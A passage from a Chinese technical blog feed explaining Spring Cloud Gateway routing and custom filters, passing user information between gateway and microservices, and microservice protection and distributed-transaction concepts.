Cloud Gateway"></a>1.4.1 微服务网关框架：Spring Cloud Gateway</h3><div class="table-container"><table><thead><tr><th>Spring Cloud Gateway</th><th>Netflix Zuul</th></tr></thead><tbody><tr><td>基于 <code>WebFlux</code> 响应式编程</td><td>基于 <code>Servlet</code> 阻塞式编程</td></tr><tr><td>无需调优即有很好性能</td><td>需要调优才有接近Spring Cloud Gateway 的性能</td></tr><tr><td>正常维护</td><td>更新较慢</td></tr></tbody></table></div><p>基于上述特点，我们以 Spring Cloud Gateway 为例。</p><p>它的使用很简单：导入依赖、编写启动类、编写配置。</p><h4 id="Spring-Cloud-Gateway-配置示例"><a href="#Spring-Cloud-Gateway-配置示例" class="headerlink" title="Spring Cloud Gateway 配置示例"></a>Spring Cloud Gateway 配置示例</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">cloud:</span></span><br><span class="line">        <span class="attr">gateway:</span></span><br><span class="line">            <span class="attr">routes:</span><span class="comment"># 路由规则列表</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&lt;Route</span> <span class="string">ID&gt;</span> <span class="comment"># 独一无二的路由 ID</span></span><br><span class="line">                  <span class="attr">uri:</span> <span class="string">lb://&lt;service</span> <span class="string">name&gt;</span> <span class="comment"># load balance，到指定服务</span></span><br><span class="line">                  <span class="attr">predicates:</span><span class="comment"># 筛选断言条件（列表）</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="string">Path=/xx/**</span><span class="comment"># 支持通配符</span></span><br><span class="line">                  <span class="attr">filters:</span></span><br><span class="line">                  <span class="bullet">-</span> [<span class="string">...</span>]<span class="string">=[...]</span></span><br><span class="line">            <span class="attr">default-filters:</span></span><br><span class="line">                <span class="bullet">-</span> [<span class="string">...</span>]<span class="string">=[...]</span></span><br></pre></td></tr></table></figure><p>众所周知，<code>application.yaml</code> 中的配置内容相当于 XML Bean，都在向 Spring 框架的类型中填写初始化属性罢了。这里 <code>spring.cloud.gateway.routes</code> 对应的是 <code>Collection&lt;RouteDefinition&gt;</code> 类型。</p><p>其中，<code>predicates</code> 属性可取以下值：</p><div class="table-container"><table><thead><tr><th>Name</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td>After</td><td>是某个时间点后的请求</td><td>After=2037-01-20T17:42:47.789-07:00[America/Denver]</td></tr><tr><td>Before</td><td>是某个时间点之前的请求</td><td>Before=2031-04-13T15:14:47.433+08:00[Asia/Shanghai]</td></tr><tr><td>Between</td><td>是某两个时间点之前的请求</td><td>Between=2037-01-20T17:42:47.789-07:00[America/Denver], 2037-01-21T17:42:47.789-07:00[America/Denver]</td></tr><tr><td>Cookie</td><td>请求必须包含某些cookie</td><td>Cookie=chocolate, ch.p</td></tr><tr><td>Header</td><td>请求必须包含某些header</td><td>Header=X-Request-Id, \d+</td></tr><tr><td>Host</td><td>请求必须是访问某个host（域名）</td><td>Host=**.somehost.org,**.anotherhost.org</td></tr><tr><td>Method</td><td>请求方式必须是指定方式</td><td>Method=GET,POST</td></tr><tr><td>Path</td><td>请求路径必须符合指定规则</td><td>Path=/red/{segment},/blue/**</td></tr><tr><td>Query</td><td>请求参数必须包含指定参数</td><td>Query=name, Jack 或者 Query=name</td></tr><tr><td>RemoteAddr</td><td>请求者的ip必须是指定范围</td><td>RemoteAddr=192.168.1.1/24</td></tr><tr><td>Weight</td><td>权重处理</td><td>Weight=group1, 2</td></tr><tr><td>X-Forwarded Remote Addr</td><td>基于请求的来源IP做判断</td><td>XForwardedRemoteAddr=192.168.1.1/24</td></tr></tbody></table></div><p><code>filters</code> 可取以下值：</p><div class="table-container"><table><thead><tr><th>Name</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td>AddRequestHeader</td><td>给当前请求添加一个请求头</td><td>AddrequestHeader=headerName,headerValue</td></tr><tr><td>RemoveRequestHeader</td><td>移除请求中的一个请求头</td><td>RemoveRequestHeader=headerName</td></tr><tr><td>AddResponseHeader</td><td>给响应结果中添加一个响应头</td><td>AddResponseHeader=headerName,headerValue</td></tr><tr><td>RemoveResponseHeader</td><td>从响应结果中移除有一个响应头</td><td>RemoveResponseHeader=headerName</td></tr><tr><td>RewritePath</td><td>请求路径重写（ant path 语法）</td><td>RewritePath=/red/?(?\&lt;segment\</td><td>.*), /\\{segment}</td></tr><tr><td>StripPrefix</td><td>去除请求路径中的N段前缀</td><td>StripPrefix=1，则路径/a/b转发时只保留/b</td></tr><tr><td>……</td><td>……</td><td>……</td></tr></tbody></table></div><blockquote><p>一共有 33 种，详见官网。</p></blockquote><p>值得注意的是，filter 是基于 router 生效的、作用于 router 的。Spring Cloud 中的 filter 分为两种：</p><ul><li>GlobalFilter：全局过滤器，作用于所有路由，在声明该过滤器后无需激活即可生效；</li><li>GatewayFilter：路由过滤器，共 33 种，作用于指定路由，默认不生效。上面的在<strong><u>配置文件</u></strong>中写的 <code>filters</code> 就是这个过滤器！</li></ul><h4 id="Spring-Cloud-Gateway-过滤机制-以及-Spring-Security-对比"><a href="#Spring-Cloud-Gateway-过滤机制-以及-Spring-Security-对比" class="headerlink" title="Spring Cloud Gateway 过滤机制 以及 Spring Security 对比"></a>Spring Cloud Gateway 过滤机制 以及 Spring Security 对比</h4><p>这里只介绍了网关 forward 的配置，那么如果想对网关做更进一步的配置（例如身份验证），应该怎么操作？</p><p>首先需要了解 Spring Cloud Gateway 的底层机制。</p><p><img src='imgs/gateway-filters.png'></p><p>这里的思路几乎和 Spring Security 的过滤器链一模一样（责任链模式）。</p><p>因此我们想加入身份验证功能，就需要在 Filter 的 <code>PRE</code> 部分定义检查逻辑。如果符合条件，则允许通过 <code>NettyRoutingFilter</code> 进行转发；否则抛出异常立即拒绝请求。</p><p>现在做身份验证的思路就非常清楚了：自定义一个 Filter 类，最好像 Spring Security 的 <code>OncePerRequestFilter</code> 一样每次请求仅通过一次，插入到 <code>NettyRoutingFilter</code> 之前，就能完成任务。</p><p><strong><u>但是有几点和之前的微服务架构截然不同</u></strong>！！！</p><p>考虑第一点：网关如何向微服务传递当前登录用户的信息？</p><p>注意到现在网关、各个微服务都是独立的服务了，和单体架构不同，我们<strong>不能</strong>通过保存在类似于 <code>SecurityContext</code> 这样的单线程上下文（<code>ThreadLocal</code>）中，把网关中检查的用户信息传给 forward 的目标服务了。</p><p>回忆一下，网关向微服务 forward 实际上已经是一次新的 HTTP 请求了，而且我们之前在 Gateway 的 filters 参数中看到，gateway 可以配置额外添加请求头信息。因此不难想到，我们可以通过在网关的自定义 filter 中加入关于用户信息的请求头就能解决这个问题！</p><p>但再考虑第二个问题：既然网关和微服务间通过传递请求头来完成用户信息传递，那微服务之间相互调用也很频繁，它们默认还是原来的请求方式（<code>Nacos + OpenFeign</code>），没有请求头，难道要更改原来的代码，每个微服务请求 Client Proxy 时还要主动记录和传递用户信息？</p><p>是的！不过幸好 <code>OpenFeign</code> 有另一套方法帮我们加上这个请求头，所以不必担心。</p><p>下面我们来认识一下如何自定义 filter，并且完成身份认证的功能。</p><h4 id="自定义-Global-Filter"><a href="#自定义-Global-Filter" class="headerlink" title="自定义 Global Filter"></a>自定义 Global Filter</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">GlobalFilter</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义 PRE 部分的 Gateway Global Filter </span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exchange 经过该 filter 时，过滤器链的请求上下文，包括 request、response、前面的 filter 写入的信息；</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chain 过滤器链中下一条要执行的 filter</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 类似 JavaScript 中的回调函数。采用了 WebFlux 的非阻塞的、响应式接口，因为 PRE 和 POST 间时间可能很长，所以实际上 POST 部分 filter 是通过定义这个回调的行为来完成的。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span>;</span><br><span class="line">    <span class="comment">/* 合理的做法是，和 Spring Security 类似，返回 chain.filter(exchange)，将 filter 链委托给下一级 */</span></span><br><span class="line">    <span class="comment">/* 如果想要阻止请求（例如未认证），那么请拿到 response，set response code，并且返回一个 response.setComplete() 标识请求已经回复（拒绝） */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还需要注意的是：</p><ul><li>global filter 需要继承于 <code>Ordered</code> 接口；</li><li>并且重写 <code>int getOrder()</code> 方法，这样能为 filter 安排插入顺序。注意：返回的整型越小优先级越高，并且 <code>NettyRoutingFilter</code> 的 order 是最大整型，因此任意一个不是 <code>INT_MAX</code> 的 order 都会让 filter 排在它的前面；</li><li>最后需要使用 <code>@Component</code> 纳入 Spring IoC Container 管理；</li><li>最后还要选一个配置类，使用 <code>@Bean</code> 提供一个 <code>GlobalFilter</code> 实例！！</li></ul><h4 id="自定义-Gateway-Filter"><a href="#自定义-Gateway-Filter" class="headerlink" title="自定义 Gateway Filter"></a>自定义 Gateway Filter</h4><p>这就是我们自定义写在 <code>filters</code> 配置文件中的 filter。本部分为进阶功能，一般使用不到。</p><p>我们需要继承于 <code>AbstractGatewayFilterFactory&lt;Object&gt;</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrintAnyGatewayFilterFactory</span> <span class="keyword">implements</span> <span class="title class_">AbtractGatewayFilterFactory</span>&lt;Config&gt; &#123;</span><br><span class="line">    <span class="comment">/* config 类型请使用你想要的，例如 List 或者自定义类型 */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> GatewayFilter <span class="title function_">apply</span><span class="params">(Config config)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GatewayFilter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Mono&lt;<span class="keyword">void</span>&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">                <span class="comment">/* same as Global Filter */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 定义传给 config 的数据类型 */</span></span><br><span class="line">    <span class="meta">@Data</span>    <span class="comment">// lombok</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String a;</span><br><span class="line">        <span class="keyword">private</span> String b;</span><br><span class="line">        <span class="keyword">private</span> String c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 定义配置参数缩写名（类似设定命令行参数缩写） */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">shortcutFieldOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> List.of(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 使用构造函数告诉 AbstractGatewayFilterFactory config 的配置类型 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PrintAnyGatewayFilterFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(Config.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的 <code>Config</code> 类型可以换成任何的自定义类型，以完成参数配置需求。如果不需要任何参数，直接使用 <code>Object</code> 类型，后面 3 个函数也就没有必要了。</p><p>这样前缀 <code>PrintAny</code>（去除 <code>GatewayFilterFactory</code>）就是配置名，我们就能自定义 filters 参数了：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">cloud:</span></span><br><span class="line">        <span class="attr">gateway:</span></span><br><span class="line">            <span class="attr">routes:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">...</span></span><br><span class="line">                  <span class="attr">uri:</span> <span class="string">...</span></span><br><span class="line">               <span class="attr">predicates:</span> <span class="string">...</span></span><br><span class="line">               <span class="attr">filters: PrintAny:</span> <span class="string">&lt;config&gt;</span><span class="comment"># 需要和自己定义的 config 类型匹配</span></span><br></pre></td></tr></table></figure><p>此外，对于 <code>GatewayFilter</code> 如果想指定顺序，请使用 <code>OrderedGatewayFilter</code> 包装：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> GatewayFilter <span class="title function_">apply</span><span class="params">(Object config)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OrderedGatewayFilter</span>(<span class="keyword">new</span> <span class="title class_">GatewayFilter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Mono&lt;<span class="keyword">void</span>&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">            <span class="comment">/* same as Global Filter */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="comment">/* order */</span> <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下，<code>GatewayFilter</code> 的定义使用了抽象工厂模式，满足了多样化定制需求。</p><h4 id="Spring-Cloud-Gateway-传递用户信息"><a href="#Spring-Cloud-Gateway-传递用户信息" class="headerlink" title="Spring Cloud Gateway 传递用户信息"></a>Spring Cloud Gateway 传递用户信息</h4><p>现在我们来解决之前提到的两个问题：</p><ul><li>网关如何向微服务传递当前登录用户的信息？</li><li>微服务之间相互调用如何使用 <code>OpenFeign</code> 传递用户信息？</li></ul><p>对第一个问题，我们采用如下思路：</p><p><img src="imgs/g2m.png"></p><p>这样我们微服务中的业务在本微服务内就沿用之前的 context 方案，无需更改，只需要修改进入微服务的拦截器即可；</p><p>先看如何更改 <code>GlobalFilter</code> 的请求内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ServerWebExchange.mutate() 方法可以返回已初始化的对象的 builder 以供修改 */</span></span><br><span class="line">exchange.mutate()</span><br><span class="line">    <span class="comment">/* 传递修改 request 的 build 方法 */</span></span><br><span class="line">    .request(builder -&gt; builder.head(<span class="string">&quot;info&quot;</span>, info))</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure><p>对于新建拦截器，我们不必在每个微服务中都写一遍，只需在共同依赖的模块中写入即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInfoInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 识别信息并保存到 context，不作拦截 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 请求结束后，请销毁 context */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得把 Interceptor 配置到 Spring 中，在每次请求前进行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(<span class="comment">/* 拦截器实例 */</span>);</span><br><span class="line">            <span class="comment">/* .addPathPattern() 可以选择作用的 path pattern，不写就是作用全部 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是还需要注意，这里的 Bean 现在没法被其他用到的模块扫描到，我们需要在这个模块的 <code>resources/META_INF/spring.factories</code> 中，配置：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">org.springframework.boot.autoconfigure.EnableAutoConfiguration</span>=<span class="string">\</span></span><br><span class="line"><span class="string">    &lt;package name&gt;.MvcConfig</span></span><br></pre></td></tr></table></figure><p>这样使得在该项目中， Spring 默认会将这个类加入 IoC Container。</p><blockquote><p>注意：在 Spring 3.x 以后，已经全面取消 <code>spring.factories</code> 中的 <code>org.springframework.boot.autoconfigure.EnableAutoConfiguration</code> 键的作用了。</p><p>在 Spring 3.x 的项目中，上面的配置是无效的，Spring 是不会扫描并且自动装配你指定的类的。</p><p>你需要在 <code>META-INT/spring/</code> 目录下新建一个文件 ``</p></blockquote><p>但是需要注意，这里采用的 <code>WebMvcConfigurer</code> 只能在微服务中生效，不能在 Gateway 中生效（因为 Gateway 是 <code>WebFlux</code> 非阻塞式接口，不能引入 Spring MVC 的接口），所以我们需要条件装配：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在 MvcConfig 前面的加入注解 */</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(DispatcherServlet.class)</span>    <span class="comment">/* 该类是 Spring MVC 的核心 API */</span></span><br></pre></td></tr></table></figure><p>对于第二个问题，我们只需要对 <code>OpenFeign</code> 的请求进行定义：让每次 <code>OpenFeign</code> 触发微服务间调用时，都带上一个自定义的请求头，就像网关传给微服务一样。这里使用 <code>OpenFeign</code> 给的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RequestInterceptor</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(RequestTemplate template)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这同样要定义在所有微服务中都依赖的模块中（因为是配置，所以用 bean 注入）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在某个配置 Feign 的类中 */</span></span><br><span class="line"><span class="keyword">public</span> RequestInterceptor <span class="title function_">userInfoInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RequestInterceptor</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(RequestTemplate template)</span> &#123;</span><br><span class="line">            <span class="comment">/* 配置请求头 */</span></span><br><span class="line">            template.header(&lt;header name str&gt;, &lt;context&gt; <span class="comment">/* 位于同线程，可用 */</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这个配置类需要显式配置给 <code>OpenFeign</code>（就像之前配置 Feign 日志的全局配置一样）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableFeignClients(value = ..., defaultConfiguration = 该类名)</span></span><br></pre></td></tr></table></figure><h1 id="Chapter-2-微服务理论"><a href="#Chapter-2-微服务理论" class="headerlink" title="Chapter 2. 微服务理论"></a>Chapter 2. 微服务理论</h1><h2 id="2-1-微服务雪崩"><a href="#2-1-微服务雪崩" class="headerlink" title="2.1 微服务雪崩"></a>2.1 微服务雪崩</h2><p>在微服务相互调用中，服务提供者出现故障或阻塞。并且：</p><ul><li>服务调用者没有做好异常处理，导致自身故障；</li><li>或者访问连接一直保持 / 请求速度大于处理速率，致使请求不断堆积在 tomcat 中导致资源耗尽；</li></ul><p>最终，调用链中的所有服务级联失败，导致整个集群故障。</p><p><img src='imgs/avalanche.png' width="500px"></p><p>解决微服务雪崩的思路主要如下：</p><ol><li>尝试避免出现故障 / 阻塞；<ul><li>保证代码的健壮性；</li><li>保证网络畅通；</li><li>能应对较高的并发请求；</li><li><strong>微服务保护</strong>：保护服务提供方；</li></ul></li><li>局部出现故障 / 阻塞后，及时做好预备方案（积极有效的错误处理）；<ul><li><strong>微服务保护</strong>：保护服务调用方；</li></ul></li></ol><h2 id="2-2-微服务保护"><a href="#2-2-微服务保护" class="headerlink" title="2.2 微服务保护"></a>2.2 微服务保护</h2><p>为了应对微服务雪崩，我们有许多解决方案。其中，微服务保护是在业务逻辑代码层面以外的一种重要方案。</p><p>微服务保护有以下一些思路：</p><ul><li><p>请求限流：保护服务提供方。限制访问微服务的请求的并发量，避免服务因流量激增出现故障（<strong>应对访问模式：spike 型</strong>）；</p></li><li><p>线程隔离（舱壁模式）：保护服务消费方。通过限定每个业务能使用的线程数量而将故障业务隔离，避免故障扩散；</p><p><img src="imgs/thread-isolation.png" width="400px"></p></li><li><p>快速失败 和 服务熔断：</p><ul><li>快速失败：给业务编写一个调用失败时的处理的逻辑，称为 <code>fallback</code>。当调用出现故障（比如无线程可用）时，按照失败处理逻辑执行业务并返回，而不是直接抛出异常；</li><li>由<strong>断路器</strong>统计请求的异常比例或慢调用比例，如果超出阈值，则认为<strong>某个微服务业务所对应的所有实例都不可用</strong>，熔断该业务，则拦截该接口的请求。熔断期间，所有请求均 <code>fallback</code> 为快速失败逻辑；</li></ul><p><img src="imgs/fuse.png" width="400px"></p></li></ul><p>以上微服务保护的策略可以使用 <code>Sentinel</code> / <code>Hystrix</code> 框架完成。</p><div class="table-container"><table><thead><tr><th>Metrics or Feature</th><th><code>Sentinel</code></th><th><code>Hystrix</code></th></tr></thead><tbody><tr><td>Belong to</td><td>Spring Cloud Alibaba</td><td>Spring Cloud Netflix</td></tr><tr><td>Thread Isolation</td><td>信号量隔离</td><td>线程池隔离/信号量隔离</td></tr><tr><td>Fuse Policy</td><td>基于慢调用比例或异常比例</td><td>基于异常比率</td></tr><tr><td>Traffic Limiting</td><td>基于 QPS，支持流量整形</td><td>支持</td></tr><tr><td>Fallback</td><td>支持</td><td>支持</td></tr><tr><td>Configuration Method</td><td>基于控制台，重启后失效</td><td>基于注解或配置文件，永久生效</td></tr></tbody></table></div><p>想了解微服务保护框架具体如何使用，请参见官网样例或官方文档。</p><h2 id="2-3-微服务分布式事务"><a href="#2-3-微服务分布式事务" class="headerlink" title="2.3 微服务分布式事务"></a>2.3 微服务分布式事务</h2><blockquote><p>在分布式系统中，如果一个业务需要多个服务合作完成，而且每一个服务都有事务，多个事务必须同时成功或失败，这样的事务就是<strong><u>分布式事务</u></strong>。其中的每个服务的事务就是一个<strong>分支事务</strong>。整个业务称为<strong>全局事务</strong>。</p></blockquote><p>除了微服务雪崩的问题外，微服务设计中还存在一个重难点：如何保证微服务数据 ACID 的性质（如何正确进行分布式事务）。</p><p>以一个商品订单服务为例：</p><p><img src="imgs/inconsistency.png" width="600px"></p><p>如果最终库存服务失败，那么虽然订单服务可能可以识别到错误并且回滚，但是购物车服务与库存服务间没有关系，极有可能不会回滚，造成数据的不一致性。这就是没有保证分布式事务一致性。</p><p>那么我们应该如何保证微服务流程的一致性？</p><p>这个时候需要引入一个分布式事务的协调组件，让各个子事务（分支事务）感知到彼此的事务状态，根据总体的事务状态进行判断，协调全局事务的提交或回滚，这样就能保证事务状态和数据的一致性。</p><p>这个分布式事务的协调组件被称为：<strong>事务协调者（Transaction Coordinator，TC）</strong>；</p><p>除了事务协调者，还需要有一个组件，用于定义单个全局事务的范围（从哪个子事务开始，到哪个子事务结束）。这个组件就被称为：<strong>事务管理器（Transaction Manager，TM）</strong>；</p><p>有了 TC 和 TM，就能准确地定义一个全局事务； </p><p>为了进一步从业务逻辑中解耦，我们额外增添一个组件用于说明某个子事务的事务状态。它的作用是，向 TC 注册子事务，并且报告子事务的事务状态。这就被称为：<strong>资源管理器（Resource Manager，RM</strong>）；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-0-基本概念&quot;&gt;&lt;a href=&quot;#Chapter-0-基本概念&quot; class=&quot;headerlink&quot; title=&quot;Chapter 0. 基本概念&quot;&gt;&lt;/a&gt;Chapter 0. 基本概念&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;微服务是一种软件架构风格。专</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Web" scheme="https://blog.sjtuxhw.top/tags/Web/"/>
    
    <category term="Microservice" scheme="https://blog.sjtuxhw.top/tags/Microservice/"/>
    
  </entry>
  
  <entry>
    <title>Semaphore, Mutex, CV</title>
    <link href="https://blog.sjtuxhw.top/technical/semaphore-mutex-and-cv/"/>
    <id>https://blog.sjtuxhw.top/technical/semaphore-mutex-and-cv/</id>
    <published>2024-05-11T15:20:35.000Z</published>
    <updated>2024-10-25T14:01:12.013Z</updated>
    
